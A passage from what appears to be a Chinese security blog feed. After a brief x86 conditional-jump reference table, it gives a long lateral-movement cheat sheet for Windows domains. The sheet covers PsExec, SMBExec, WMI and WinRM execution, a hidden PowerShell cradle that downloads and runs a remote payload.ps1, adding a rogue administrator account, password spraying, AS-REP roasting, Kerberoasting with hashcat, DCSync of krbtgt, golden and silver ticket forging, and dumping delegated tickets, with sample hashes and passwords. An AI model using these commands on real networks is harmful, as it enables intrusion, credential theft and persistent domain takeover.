title="JCC指令"></a>JCC指令</h1><table><thead><tr><th>JCC指令</th><th>中文含义</th><th>英文原意</th><th>检查符号位</th><th>典型c应用</th></tr></thead><tbody><tr><td>JZ&#x2F;JE</td><td>若为0则跳转；若相等则跳转</td><td>jump if zero;jump if equal</td><td>ZF&#x3D;1</td><td>if (i &#x3D;&#x3D; j);if (i &#x3D;&#x3D; 0);</td></tr><tr><td>JNZ&#x2F;JNE</td><td>若不为0则跳转；若不相等则跳转</td><td>jump if not zero;jump if not equal</td><td>ZF&#x3D;0</td><td>if (i !&#x3D; j);if (i !&#x3D; 0);</td></tr><tr><td>JS</td><td>若为负则跳转</td><td>jump if sign</td><td>SF&#x3D;1</td><td>if (i &lt; 0);</td></tr><tr><td>JNS</td><td>若为正则跳转</td><td>jump if not sign</td><td>SF&#x3D;0</td><td>if (i &gt; 0);</td></tr><tr><td>JP&#x2F;JPE</td><td>若1出现次数为偶数则跳转</td><td>jump if Parity (Even)</td><td>PF&#x3D;1</td><td>(null)</td></tr><tr><td>JNP&#x2F;JPO</td><td>若1出现次数为奇数则跳转</td><td>jump if not parity (odd)</td><td>PF&#x3D;0</td><td>(null)</td></tr><tr><td>JO</td><td>若溢出则跳转</td><td>jump if overflow</td><td>OF&#x3D;1</td><td>(null)</td></tr><tr><td>JNO</td><td>若无溢出则跳转</td><td>jump if not overflow</td><td>OF&#x3D;0</td><td>(null)</td></tr><tr><td>JC&#x2F;JB&#x2F;JNAE</td><td>若进位则跳转；若低于则跳转；若不高于等于则跳转</td><td>jump if carry;jump if below;jump if not above equal</td><td>CF&#x3D;1</td><td>if (i &lt; j);</td></tr><tr><td>JNC&#x2F;JNB&#x2F;JAE</td><td>若无进位则跳转；若不低于则跳转；若高于等于则跳转</td><td>jump if not carry;jump if not below;jump if above equal</td><td>CF&#x3D;0</td><td>if (i &gt;&#x3D; j);</td></tr><tr><td>JBE&#x2F;JNA</td><td>若低于等于则跳转；若不高于则跳转</td><td>jump if below equal;jump if not above</td><td>ZF&#x3D;1或CF&#x3D;1</td><td>if (i &lt;&#x3D; j);</td></tr><tr><td>JNBE&#x2F;JA</td><td>若不低于等于则跳转；若高于则跳转</td><td>jump if not below equal;jump if above</td><td>ZF&#x3D;0或CF&#x3D;0</td><td>if (i &gt; j);</td></tr><tr><td>JL&#x2F;JNGE</td><td>若小于则跳转；若不大于等于则跳转</td><td>jump if less;jump if not greater equal</td><td>SF !&#x3D; OF</td><td>if (si &lt; sj);</td></tr><tr><td>JNL&#x2F;JGE</td><td>若不小于则跳转；若大于等于则跳转</td><td>jump if not less;jump if greater equal</td><td>SF&#x3D;OF</td><td>if (si &gt;&#x3D; sj);</td></tr><tr><td>JLE&#x2F;JNG</td><td>若小于等于则跳转；若不大于则跳转</td><td>jump if less equal;jump if not greater</td><td>ZF !&#x3D; OF 或 ZF&#x3D;1</td><td>if (si &lt;&#x3D; sj);</td></tr><tr><td>JNLE&#x2F;JG</td><td>若不小于等于则跳转；若大于则跳转</td><td>jump if not less equal;jump if greater</td><td>SF&#x3D;OF 且 ZF&#x3D;0</td><td>if(si&gt;sj)</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动(二)</title>
      <link href="/2024/11/11/2024-10-8-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%BA%8C)/"/>
      <url>/2024/11/11/2024-10-8-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="PSEXEC上线操作"><a href="#PSEXEC上线操作" class="headerlink" title="PSEXEC上线操作"></a>PSEXEC上线操作</h1><p>如果是工作组情况，最好用PTH认证</p><p>如果是域最好使用票据。</p><p>建立连接可上线的情况</p><p><img src="/%5Cimages%5Cposts%5C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%5Cimage-20241004190010156.png"></p><pre class="language-none"><code class="language-none">jump psexec Win7.test.local [监听器名]</code></pre><h1 id="SMBEXEC上线"><a href="#SMBEXEC上线" class="headerlink" title="SMBEXEC上线"></a>SMBEXEC上线</h1><p>SMBEXEC工作原理：</p><pre class="language-none"><code class="language-none">1、建立IPC$连接2、通过服务执行命令2、将命令放在%temp%&#x2F;execute.bat中3、运行execute.bat文件，将结果存储在C:&#x2F;__output文件中4、删除execute.bat5、通过客户端读取目标机器的C:&#x2F;__output文件中内容</code></pre><p>命令：</p><pre class="language-none"><code class="language-none">smbexec.exe administrator:admin@123@192.168.142.10smbexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 administrator@192.168.142.10</code></pre><h1 id="WMI横向移动"><a href="#WMI横向移动" class="headerlink" title="WMI横向移动"></a>WMI横向移动</h1><pre class="language-none"><code class="language-none">1、执行命令并且输出wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot; 2、列出远程主机进程wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process list brief3、在远程系统上执行bat脚本wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process call create c:\test.bat4、添加用户wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process call create &quot;cmd.exe &#x2F;c net usertest1 !@#123QWE &#x2F;add &amp;&amp; net localgroup administrators test1 &#x2F;add5、执行powershell上线wmic &#x2F;NODE:IP &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 PROCESS call create &quot;powershell.exe -nop -w hidden -c\&quot;IEX ((new-object net.webclient).downloadstring(&#39;ps脚本地址&#39;))\&quot;&quot;</code></pre><p>条件：</p><pre class="language-none"><code class="language-none">使用条件如下：1、wmic命令需要本地管理员或域管理员权限（有UAC也可以）2、横向的用户需要是域管理员或者域普通管理员，工作组需要Administratora2、135端口开放3、开放445（某些脚本需要借助SMB认证）</code></pre><p>CS上线</p><ol><li>自带命令上线</li></ol><p>如果是hash，票据等，就可以先PTH，PTT先认证，后面就不用加user和password等</p><pre class="language-none"><code class="language-none">wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process call create &quot;cmd.exe &#x2F;cnet user test1 !@#123QWE &#x2F;add &amp;&amp; net localgroup administrators test1 &#x2F;add执行powershell上线wmic &#x2F;NODE:IP &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 PROCESS call create &quot;powershell.exe-nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;ps脚本地址&#39;))\&quot;&quot;</code></pre><p>2、wmicexec工具，该工具因为还走了一些SMB认证和访问共享等行为，杀软会拦截</p><pre class="language-none"><code class="language-none">wmiexec.exe 域名&#x2F;用户名:密码@目标IP #哈希传递获得shellwmiexec.exe 域名&#x2F;用户名:密码@目标IP &quot;ipconfig&quot; #执行命令wmiexec.exe -hashes LM Hash:NT Hash 域名&#x2F;用户名@目标IP #哈希传递获得shellwmiexec.exe -hashes LM Hash:NT Hash 域名&#x2F;用户名@目标IP &quot;ipconfig&quot; #执行命令wmiexec.exe administrator:Admin@123@192.168.41.40 &quot;powershell.exe -nop -w hidden -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;payload.ps1&#39;))&quot;</code></pre><ol start="3"><li>wmiexec.vbs脚本</li></ol><blockquote><p>通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式Shell。wmiexec.vbs支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式</p></blockquote><p>命令：</p><pre class="language-none"><code class="language-none">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd IP 用户 密码 &quot;命令“ 上线：cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd 192.168.41.148 administrator Admin@123 &quot;powershell.exe - nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;payload.ps1&#39;))&quot;</code></pre><ol start="4"><li>Invoke-WMIExec</li></ol><blockquote><p>Invoke-WMIExec是一个powershell脚本在Invoke-TheHash的文件中用法如下</p></blockquote><p><code>Invoke-WMIExec -Target IP -Domain 域 -Username 用户 -Hash hash-Command &quot;calc.exe&quot; –verbose</code></p><p>CS中</p><pre class="language-none"><code class="language-none">步骤Invoke-WMIExec.ps1放在CS目录下1、powershell-import Invoke-WMIExec.ps12、powershell Invoke-WMIExec -Target 192.168.41.20 -Username administrator -Hash570a9a65db8fba761c1008a51d4c95ab -Command &quot;powershell.exe -nop -w hidden -c IEX ((new-objectnet.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;payload.ps1&#39;))&quot; -verbose</code></pre><h1 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h1><blockquote><p>Windows 远程管理 (Windows Remote Management)简称WinRM 是 WS 管理协议的Microsoft</p><p>实现，WS 管理协议是基于标准简单对象访问协议 （SOAP） 的防火墙友好协议，允许来自不同供应</p><p>商的硬件和操作系统之间进行互操作。WS 管理协议规范为系统提供了一种跨 IT 基础结构访问和交换</p><p>管理信息的通用方法。</p></blockquote><p><strong>WinRM端口：</strong></p><p>HTTP是5985端口进行通信</p><p>HTTPS 是5986端口来进行通信</p><p><strong>开启：</strong></p><p>开启WinRM服务 powershell 运行 enable-psremoting或者cmd运行winrm quickconfig（过UAC管理员运行）</p><p><strong>查询开启</strong></p><p>powershell 运行 enable-psremoting或者cmd运行winrm quickconfig提示。</p><p>查询5985或者5986端口看看是否开启</p><p>对方电脑开启后</p><p>1、winrs命令</p><p>在建立了PTH,PTT,PTK之后不需要再进行输入账号密码,使用这种方式杀软不会报毒</p><pre class="language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;[目标IP]:5985 -u:机器名\用户名 -p:xxxxx &quot;ipconfig&quot; winrs -r:https:&#x2F;&#x2F;[目标IP]:5985 -u:机器名\用户名 -p:xxxxx &quot;ipconfig&quot; winrs -r:http:&#x2F;&#x2F;[目标IP]:5985 -u:机器名\用户名 -p:xxxxx cmdwinrs -r:https:&#x2F;&#x2F;[目标IP]:5985 -u:机器名\用户名 -p:xxxxx cmd</code></pre><blockquote><p>Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与IP地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。</p></blockquote><pre class="language-none"><code class="language-none">winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;</code></pre><p>2、powershell</p><pre class="language-none"><code class="language-none">Invoke-Command -ComputerName TARGET -ScriptBlock &#123; dir c:\ &#125;Invoke-Command -ComputerName TARGET -Credential 域名\用户名 -command &#123;Get-Culture&#125;Invoke-Command -ComputerName TARGET -Credential 域名\用户名 -ScriptBlock &#123;Get-Culture&#125;</code></pre><h1 id="喷洒攻击"><a href="#喷洒攻击" class="headerlink" title="喷洒攻击"></a>喷洒攻击</h1><p><strong>一、kerbrute工具</strong></p><blockquote><p>kerbrute使用Go语言开发，github提供了编译好的文件，</p><p>地址： <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p></blockquote><p>1、kerbrute工具域内用户枚举</p><pre class="language-none"><code class="language-none">kerbrute.exe userenum--dc 域控IP -d 域名 用户字典</code></pre><p>2、Kerbrute域内密码喷洒</p><p>锁定策略:限制次数</p><pre class="language-none"><code class="language-none">kerbrute.exe passwordspray--dc 域控IP -d 域名 用户字典 密码（单密码）（有锁定策略使用）kerbrute.exe bruteuser--dc 域控IP -d 域名 密码字典 用户名（没有锁定策略使用）</code></pre><p><strong>二、pykerbute工具</strong></p><p>该工具使用python2编写</p><p>用户枚举</p><pre class="language-none"><code class="language-none">EnumADUser.py [域控IP] [域名] [字典] [协议]EnumADUser.py 192.168.41.10 abc.com user.txt tcp</code></pre><p>密码喷洒,可用Hash</p><pre class="language-none"><code class="language-none">ADPwdSpray.py [域控IP] [域名] [用户名字典] clearpassword [密码]ADPwdSpray.py [域控IP] [域名] [用户名字典] ntlmhash [哈希值] udp</code></pre><p>工作组内主机上线域控如果使用PTT就必须将主机的DNS服务器指向域控,不然票据会失效</p><h1 id="Roasting攻击"><a href="#Roasting攻击" class="headerlink" title="Roasting攻击"></a>Roasting攻击</h1><p>原理:</p><blockquote><p>AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式,他是因为管理员的错误配置导致的，</p><p>该攻击是AS-REP数据包导致的，因为管理员在域控上勾选了【不要求Kerberos】预身份验证</p></blockquote><p><img src="/%5Cimages%5Cposts%5C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%5Cimage-20241005163240744.png"></p><p>正常的请求，我们输入正确的账号密码才有AS-REP数据包，打钩之后我们不需要提供密码，只需要提供账号，AS就会返回TGT还有加密的sessionkey，因此我们破解该字段内容就可以得到用户的密码</p><p><strong>获取勾选预认证用户列表</strong></p><p>1、域控上执行：</p><pre class="language-none"><code class="language-none">Get-ADUser-Filter&#39;useraccountcontrol-band4194304&#39;-Properties  useraccountcontrol|Format-Tablename</code></pre><p>2、在域内主机上执行：</p><pre class="language-none"><code class="language-none">Import-Module.\PowerView.ps1Get-DomainUser-PreauthNotRequired–VerboseGet-DomainUser-PreauthNotRequired-Propertiesdistinguishedname-Verbose</code></pre><p><strong>获取AS-REQ的ENC-PART</strong></p><p>ASREPRoast.ps1脚本</p><pre class="language-none"><code class="language-none">Import-Module .\ASREPRoast.ps1Invoke-ASREPRoast | select-ExpandPropertyHash</code></pre><p>工作组用户:</p><p>使用用户字典一个一个去试试,枚举的方式：</p><pre class="language-none"><code class="language-none">impacket-GetNPUsers -dc-ip [域控IP] -usersfile [字典文件] -formatjohn [域名]&#x2F;impacket-GetNPUsers -dc-ip 192.168.41.10 -usersfile 1.txt -formatjohn abc.com&#x2F;</code></pre><p>Windows版本只支持单用户</p><pre class="language-none"><code class="language-none">GetNPUsers.exe -dc-ip [域控IP] [域名]&#x2F;[用户名] -no-passGetNPUsers.exe -dc-ip 192.168.41.10 abc.com&#x2F;ww -no-pass</code></pre><p><strong>暴力破解用户域用户密码</strong></p><ol><li>john</li></ol><pre class="language-none"><code class="language-none">john --wordlist&#x3D;密码字典 part值john --wordlist&#x3D;.&#x2F;pass.txt 1.xt </code></pre><ol start="2"><li>hashcat</li></ol><pre class="language-none"><code class="language-none">hashcat –m 18200 hash.txt 密码字典 –force</code></pre><p>我们直接生成的part值中和手册中的值不符合因为少了$23。需要自己手动改一下</p><p>Hashcat命令格式：<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a> </p><p><img src="/%5Cimages%5Cposts%5C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%5Cimage-20241005171633858.png"></p><h1 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h1><blockquote><p>Kerberoasting 是域渗透中经常使用的一项技术，是Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后，不少研究人员对 Kerberoasting 进行了改进和扩展，在 GitHub 上开发发布了大量工具，使得 Kerberoasting 逐渐发展成为域攻击的常用方法之一。Kerberoast攻击是在TGS_REP的过程中用户将会收到由目标服务实例的NTLM hash加密生成的ST(service ticket)，如果获得这个ST票据，我们可以尝试穷举口令，模拟加密过程，进行破解。</p></blockquote><p>原理：</p><pre class="language-none"><code class="language-none">1、ST票据的加密方式没有强制采用aes256，可以使用MD5的加密2、在TGS认证TGT的时候，不管提供的用户是否具有访问目标服务的权限都会返回目标服务的ST</code></pre><p><strong>SPN</strong></p><blockquote><p>服务主体名称SPN(Server principal Name SPN)，是服务实例（可以理解为一个服务，比如 HTTP、</p><p>MSSQL）的唯一标识符。Kerberos 身份验证使用SPN将服务实例与服务帐户相关联。在域中如果有</p><p>多个服务，每个服务必须有自己的SPN和用户，一个用户可以有多个SPN，但是SPN只能对应一个用</p><p>户</p></blockquote><p>SPN注册</p><pre class="language-none"><code class="language-none">1、setspn –U –S HTTP&#x2F;PC-ZS.ABC.COM wanli注册一个SPN 是HTTP服务对用的电脑是PC-ZS ,在域用户wanli下2、setspn –C –S HTTP&#x2F;PC-ZS.ABC.COM将HTTP服务的SPN注册到当前机器用户下</code></pre><p><strong>SPN探测</strong></p><p>域内用户</p><pre class="language-none"><code class="language-none">1、setspn命令Setspn –Q *&#x2F;* 查询所有的SPNSetspn –T abc.com –Q *&#x2F;* 查询指定域中的SPN2、PowerViewImport-Module .\PowerView.ps1Get-NetUser –SPN这个脚本可以查询域用户注册的SPN，机器用户注册的查不了3、GetUserSPNs脚本，直接导入即可</code></pre><p>非域内的主机，可以通过adfind,但是必要提供一个域中的账号密码</p><pre class="language-none"><code class="language-none">1、域内机器：Adfind.exe -b &quot;dc&#x3D;abc,dc&#x3D;com&quot; -f &quot;&amp;(servicePrincipalName&#x3D;*)&quot; servicePrincipalName2、非域机器：Adfind.exe -h [域控IP]:389 -u 域前缀\用户名 -up 密码 -f &quot;&amp;(servicePrincipalName&#x3D;*)&quot; servicePrincipalNameAdfind.exe -h 192.168.41.10:389 -u abc\ww -up Admin@123 -f &quot;&amp;(servicePrincipalName&#x3D;*)&quot; servicePrincipalName查找高权限的SPNAdfind.exe -h 192.168.41.10:389 -u abc\ww -up Admin@123 -f &quot;&amp;(servicePrincipalName&#x3D;*)(admincount&#x3D;1)&quot; servicePrincipalName</code></pre><p><strong>获取高权限SPN服务票据</strong></p><p>SPN就是用来破解SPN对应账户的密码但是SPN的可以注册在机器用户下和域用户下</p><p>1、机器用户下（机器用户的密码是不可能获取到的，他是随机的，是无法进行破解的）</p><p>2、域用户下（SPN可以注册在任何的域用户下，所以需要查询高权限的域用户下的SPN）</p><p><strong>在非域主机的电脑上：</strong></p><p>1、impacket工具下面的GetUserSPNs工具，这个工具在域主机和非域主机都可以使用</p><p>获取域中所有注册SPN的用户ST票据,前提是要能通讯域控</p><pre class="language-none"><code class="language-none">1、GetUserSPNs.exe -request -dc-ip [域控IP] [域名]&#x2F;[用户名]:[密码] -outputfile [导出文件路径]GetUserSPNs.exe -request -dc-ip 192.168.41.10 abc.com&#x2F;ww:Admin@123 -outputfile 1.txt2、GetUserSPNs.exe -request -dc-ip [域控IP] [域名]&#x2F;[用户名]:[密码] -outputfile [导出文件路径] -request-user [用户名]  指定用户GetUserSPNs.exe -request -dc-ip 192.168.41.10 abc.com&#x2F;ww:Admin@123 -outputfile 1.txt -request-user wanli</code></pre><p>2、Rubeus工具，这个工具不能用于工作组的电脑，因为不支持认证，在域中的电脑执行如下</p><pre class="language-none"><code class="language-none">Rubeus.exe kerberoast &#x2F;format:john &#x2F;outfile:1.txt   导出所有用户的哈希值</code></pre><p>3、可以使用mimikatz直接申请ST票据，然后从内存中导出来</p><pre class="language-none"><code class="language-none">Setspn –Q *&#x2F;* 查询所有的SPNkerberos::ask &#x2F;target:[服务名] 申请票据保存在内存中kerberos::ask &#x2F;target:MYSQL&#x2F;PC-ZS kerberos::list &#x2F;export 导出所有票据</code></pre><p><strong>破解用户ST票据HASH</strong></p><p>1、使用tgsrepcrack脚本</p><pre class="language-none"><code class="language-none">Python2 tgsrepcrack.py 密码字典 票据</code></pre><p>2、Hashcat</p><p>Hash格式的（分为john格式和hacat格式一般都是hashcat）：</p><pre class="language-none"><code class="language-none">Hashcat –m 13100 [hash文件] [密码字典] --forceHashcat –m 13100 hash.txt pass.txt --force</code></pre><p><strong>kerberoasting攻击总结</strong></p><p>1、检查电脑是否加入域</p><pre class="language-none"><code class="language-none">1、如果是工作组（先用喷洒得到一个域用户和密码）2、然后使用Adfind查询可以利用的SPN3、如果加入了域直接使用工具查询高权限的SPN</code></pre><p>2、找到可利用的SPN用户获取该用户的ST票据（这里使用加入域的电脑）</p><pre class="language-none"><code class="language-none">Rubeus.exe kerberoast &#x2F;format:john &#x2F;outfile:hash.txt</code></pre><p>3、使用hashcat破解密码</p><pre class="language-none"><code class="language-none">Hashcat –m 13100 hash pass --force</code></pre><p>4、得到用户的hash值之后，获取该用户的PTT票据</p><pre class="language-none"><code class="language-none">shell getTGT.exe test.local&#x2F;admin:password</code></pre><p>5、使用mimikatz将票据注入的内存中</p><pre class="language-none"><code class="language-none">Mimikatz: Kerberos:ptc</code></pre><p>6、横向移动进行上线</p><pre class="language-none"><code class="language-none">shell wmic &#x2F;NODE:IP PROCESS call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;ps脚本地址&#39;))\&quot;&quot;</code></pre><h1 id="黄金票据-Golden-Ticket"><a href="#黄金票据-Golden-Ticket" class="headerlink" title="黄金票据(Golden Ticket)"></a>黄金票据(Golden Ticket)</h1><p>黄金票据发生在 AS-REP的阶段，黄金票据就是伪造TGT</p><p><strong>黄金票据的作用：</strong></p><pre class="language-none"><code class="language-none">1、可以用来权限维持2、可以用来横向移动</code></pre><p><strong>利用条件:</strong></p><p>1、必须知道KDC秘钥分发中心账户KRBTGT的hash值（重要）<br>2、域名（）</p><p>3、域的SID值<br>域的SID值（在域中执行whoami &#x2F;all)</p><p><img src="/%5Cimages%5Cposts%5C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%5Cimage-20241006141536516.png"></p><p>4、需要伪造的用户（一般都是域管理员）administrator</p><p><strong>KRBTGT-Hash值获取方式</strong></p><p>获取KRBTGT的hash值，该值的有两种方式</p><p>1、控制了域控然后查询</p><p>2、通过dcsync查询</p><p>1、krbtgt是域用户，不是域控上的本地用户所以存储不在域控的SAM文件中，而是在ntds文件中</p><p>2、如果没有控制域控，可以通过dcsync的技术获取</p><p>高权限用户</p><pre class="language-none"><code class="language-none">mimikatz lsadump::dcsync &#x2F;domain:abc.com &#x2F;user:krbtgt</code></pre><p><img src="/%5Cimages%5Cposts%5C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%5Cimage-20241006142031694.png"></p><p>黄金票据制作方式</p><p>1、impacket中的工具TICKETER(本工具是本地生的)</p><pre class="language-none"><code class="language-none">ticketer -domain-sid [krbtgt的sid值] -nthash [krbtgt-hash] -domain 域名 伪造的用户ticketer -domain-sid S-1-5-21-2716900768-72748719-3475352185 -nthash 1e01cab49f16c599465b754c96e5ae4d -domain abc.com administrator</code></pre><p>2、可以使用mimikatz直接生成然后注入到内存（和CS中自带功能是一样）</p><pre class="language-none"><code class="language-none">kerberos::golden &#x2F;user:[伪造用户] &#x2F;domain:域名 &#x2F;sid:[SID值] &#x2F;krbtgt:[NTLM-HASH] &#x2F;pttkerberos::golden &#x2F;user:administrator &#x2F;domain:abc.com &#x2F;sid:S-1-5-21-2716900768- 72748719-3475352185 &#x2F;krbtgt:1e01cab49f16c599465b754c96e5ae4d &#x2F;ptt</code></pre><p>不加&#x2F;ptt就会本地生成.Kirbi文件，mimikatz在导入也是一样的效果，可保存到本地用于权限维持，也可本地生成防杀软</p><p><strong>总结上线:</strong></p><ol><li>对服务器进行域内信息收集，并且检查自身的权限，如果是管理员权限直接dcsync</li></ol><pre class="language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:abc.com &#x2F;user:krbtgt</code></pre><ol start="2"><li><p>获取伪造TGT的其他条件【域SID】【域名】</p></li><li><p>进行PTT之后，就可以进行横向移动横向移动方式很多。Wmic，也可以使用CS的自带工具，横向的时候注意杀软，尽量不要使用（PSEXEC,SMBEXEC,WICEXC ）因为这些集成的工具会有一些落地行为和多个协议认证行为，容易被检测</p></li></ol><p><strong>工作组机器下的黄金票据制作和CS上线</strong></p><p>1、修改DNS或者HOST文件，如果在不同域的情况下需要修改&#96;</p><pre class="language-none"><code class="language-none">netsh interface ipv4 add dns 网口名字 DNS   不建议，因为实战会掉线echo [域控IP] [域控] &gt;&gt; C:\Windows\System32\drivers\etc\hostsecho 192.168.41.10 dc.test.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></pre><p>2、获取伪造TGT的其他条件【域SID】【域名】</p><p>3、横向移动</p><h1 id="白银票据-SILVER-TICKET"><a href="#白银票据-SILVER-TICKET" class="headerlink" title="白银票据(SILVER TICKET)"></a>白银票据(SILVER TICKET)</h1><p>白银票据就伪造ST票据， kerberoasting是破解ST票据中的服务用户hash值，有以下区别</p><p>白银票据：伪造的ST使用的是机器用户的Hash值</p><p>Kerberoasting:破解的是ST的域用户的hash值</p><p><strong>白银票据利用的条件</strong></p><pre class="language-none"><code class="language-none">1.域名2.域sid3.目标服务器名(域名)4.可利用的服务5. 目标机器用户的NTLM-HASH6.需要伪造的用户名</code></pre><p><strong>HAHS值获取</strong></p><p>1、如果有域中的管理员账号可以使用dcsync读取</p><pre class="language-none"><code class="language-none">lsddump::dcsync &#x2F;domain:test.local &#x2F;all &#x2F;csv</code></pre><p>2、如果通过枚举出来一个域中的管理员用户，可以使用如下的命令</p><pre class="language-none"><code class="language-none">secretsdump.exe 域名&#x2F;[账号]:密码@IPsecretsdump.exe test.local&#x2F;administrator:password@192.168.235.138</code></pre><p><strong>白银票据伪造常用服务</strong></p><pre class="language-none"><code class="language-none">1、CIFS在windows主机之间进行网络文件共享是通过使用微软公司自己的CIFS服务实现的2、伪造LDAP服务权限可以实现ldap查询，或者执行dcsync 3、host服务可以实现计划任务等</code></pre><p><strong>制作方式</strong></p><pre class="language-none"><code class="language-none">kerberos::golden &#x2F;domain:域名 &#x2F;sid:SID &#x2F;target:目标机器 &#x2F;service:服务名 &#x2F;rc4:NTLM-HASH &#x2F;user:[伪造的用户]&#x2F;pttkerberos::golden &#x2F;domain:test.local &#x2F;sid:SID &#x2F;target:dc.test.local &#x2F;service:LDAP &#x2F;rc4:NTLM-HASH &#x2F;user:administrator&#x2F;ptt</code></pre><p><strong>CS上线</strong></p><p>1、检查电脑是否加入域,加入域直接可以使用白银票据</p><p>2、查询白银票据的使用条件。伪造ldap使用mimikatz进行生成和传递</p><p>3、通过dcsync查询域控上的hash值</p><p>4、制作金票，或者进行pthptkptt等认证然后进行横向移动</p><pre class="language-none"><code class="language-none">wmic &#x2F;NODE:IP PROCESS call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#39;ps 脚本地址&#39;))\&quot;&quot;</code></pre><p><strong>工作组上线</strong></p><p>在工作组中的机器使用白银票据的时候需要注意如下的问题</p><p>1、工作组机器的DNS必须修改成域控的IP(主要是工作组中的机器需要ping通域名)</p><p>2、如果不修改DNS，可以修改本地的HOST文件，将域名执行对应的IP地址</p><p>步骤</p><p>1、检查机器是否加入了域</p><p>2、修改DNS或者HOST文件，如果在ping不同域名的情况下需要修改</p><pre class="language-none"><code class="language-none">echo [域控IP] [域控] &gt;&gt; C:\Windows\System32\drivers\etc\hostsecho 192.168.41.10 dc.test.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></pre><p>3、查询白银票据的使用条件。伪造ldap使用mimikatz进行生成和传递</p><p>4、通过dcsync查询域控上的hash值</p><p>5、制作金票，或者进行pthptkptt等认证然后进行横向移动</p><pre class="language-none"><code class="language-none">wmic &#x2F;NODE:IP PROCESS call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#39;ps 脚本地址&#39;))\&quot;&quot;</code></pre><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h2 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h2><blockquote><p>机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。</p></blockquote><p><strong>利用：</strong></p><pre class="language-none"><code class="language-none">1、管理员主动访问被配置了非约束性委派的机器2、管理员被动访问被配置了非约束性委派的机器（结合漏洞即刻触发）</code></pre><p>非约束性委派设置在域控上，设置的对象分为两种</p><pre class="language-none"><code class="language-none">1、机器账号2、注册了SPN的域用户</code></pre><p>配置了非约束性委派的机器，一旦访问该机器，TGT就会被缓存在lsass进程的内存中，通过klist是不能查看的，必须查看内存</p><p><strong>查看：</strong></p><pre class="language-none"><code class="language-none">privilege::debugmimikatz sekurlsa::tickets  查看票据信息mimikatz sekurlsa::tickets &#x2F;export   导出票据</code></pre><p><strong>注意</strong></p><pre class="language-none"><code class="language-none">1、域控是默认配置了非约束性委派的（跨域攻击可以用到）2、配置的非约束性委派最好是机器用户容易触发</code></pre><p><strong>查询配置非约束性委派</strong></p><p>1、通过ADFIND进行查询，如果是工作组机器需要提供用域名和密码，如果是用域用户就不需要提供</p><pre class="language-none"><code class="language-none">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;local&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))“ -dn</code></pre><p>2、查询域用户（配置了SPN）配置了非约束性委派</p><pre class="language-none"><code class="language-none">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;local&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</code></pre><p>工具使用：</p><p>Powershell下的命令</p><pre class="language-none"><code 